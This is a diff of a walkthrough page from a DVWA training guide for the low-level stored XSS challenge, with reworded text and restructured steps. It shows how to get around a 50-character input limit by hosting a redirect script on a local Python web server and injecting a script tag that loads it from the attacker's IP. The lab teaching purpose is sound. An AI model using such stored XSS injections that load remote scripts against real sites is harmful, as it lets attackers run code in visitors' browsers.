@@ -10,9 +10,7 @@
 
 <h3><b>Exploring the Form</b></h3>
 
-<i>Note: This challenge is extremely similar to <a href="https://github.com/keewenaw/dvwa-guide-2019/blob/master/low/Challenge%2010:%20XSS%20(DOM).md" target="_blank">Challenge 10</a>. We'll be using the same web server and exploit as before, so make sure those are good to go before proceeding.</i>
-
-Okay, let's start in the normal place, the basic form:
+Okay, let's start in the normal place, the provided form:
 
 <img src="https://github.com/keewenaw/dvwa-guide-2019/blob/master/low/screenshots/xsssform.png" width="500">
 
@@ -26,7 +24,7 @@ So let's do a proof-of-concept XSS test as such:
 
 <img src="https://github.com/keewenaw/dvwa-guide-2019/blob/master/low/screenshots/xssstestalert.png" width="500">
 
-We could in theory test the "Name" field as well, but the code snippet above gets truncated. When we inspect the source code, we see that the form restricts "Name" input to 10 characters and "Message" input to 50 characters.
+We could in theory test the "Name" field as well, but the code snippet above gets truncated. When we inspect the source code, we see why - the form restricts "Name" input to 10 characters and "Message" input to 50 characters.
 
 <img src="https://github.com/keewenaw/dvwa-guide-2019/blob/master/low/screenshots/xssstestsource.png" width="500">
 
@@ -42,21 +40,25 @@ We know in order to beat the challenge, we must find some way in Javascript to r
 
 So logically speaking, our exploit becomes:
 
-<code>&#60;script&#62;window.location.replace("http://www.google.com")&#60;/script&#62;</code>
+<code>&#60;script&#62;window.location.replace("http://www.google.com");</script></code>
 
-But wait, that's 66 characters. We saw by reviewing the source that we have to keep whatever we put in the "Message" field under 50 characters. We thankfully do have a workaround, which we've used in the other XSS challenges. We can stand up a temporary web server, hosting a Javascript file with our payload, and craft our exploit such that it calls the payload on our server. In practice:
+But wait, that's 66 characters. We saw by reviewing the source that we have to keep whatever we put in the "Message" field under 50 characters. We thankfully do have a workaround, which we've kind of used in the other XSS challenges. Essentially, we can stand up a temporary web server, hosting a Javascript file with our payload, and craft our exploit such that it calls the payload on our server. In practice:
 
-Set up your server with: <code>python -m SimpleHTTPServer 80</code>
 <ul>
-  <li>We set the <code>port</code> argument to 80 so we don't need to specify a port in our exploit. That will save us 5 characters. Note that you may need to kill your running Apache instance with <code>service apache2 stop</code> for this to work.</li>
+  <li>Set up your server with: <code>python -m SimpleHTTPServer 80</code>
+    <ul>
+      <li>We set the <code>port</code> argument to 80 so we don't need to specify a port in our exploit. That will save us 5 characters. Note that you may need to kill your running Apache instance with <code>service apache2 stop</code> for this to work.</li>
+    </ul>
+  </li>
+  <li>Payload: <code>window.location.replace("http://www.google.com");</code>
+    <ul>
+      <li>We'll save this as with a short name to save even more characters. I chose "r.js".</li>
+    </ul>
+  </li>
+  <li>Exploit: <code>&#60;script src=http://[your_Kali_IP]/r.js&#62;&#60;/script&#62;</code></li>
 </ul>
-Payload: <code>window.location.replace("http://www.google.com");</code>
-<ul>
-  <li>We'll save this as with a short name to save even more characters. I chose "r.js".</li>
-</ul>
-Exploit: <code>&#60;script src=http://[your_Kali_IP]/r.js&#62;&#60;/script&#62;</code>
 
-With this setup, your exploit should be around 48 characters in length, give or take a few. That's the perfect length, and we should be able to implement the attack.
+With this setup, your exploit should be around 48 characters in length, give or take a few depending on your IP address or file name. That's the perfect length, and we should be able to implement the attack.
 
 Let's go back to the form and try it out! For "Name", put anything you want, like "test". For "Message", input our shortened exploit.
 
@@ -64,7 +66,7 @@ Let's go back to the form and try it out! For "Name", put anything you want, lik
 
 Inspecting the new guestbook entry (Right-click > "Inspect Element") and reviewing the source code shows us that we successfully inserted the malicious script into our web page:
 
-<img src="https://github.com/keewenaw/dvwa-guide-2019/blob/master/low/screenshots/xsssexploitsource.png" width="500">
+<img src="https://github.com/keewenaw/dvwa-guide-2019/blob/master/low/screenshots/xsssexploitsource.png" width="700">
 
 Looking at the Python web server shows a successful attempt to retrieve our payload:
 
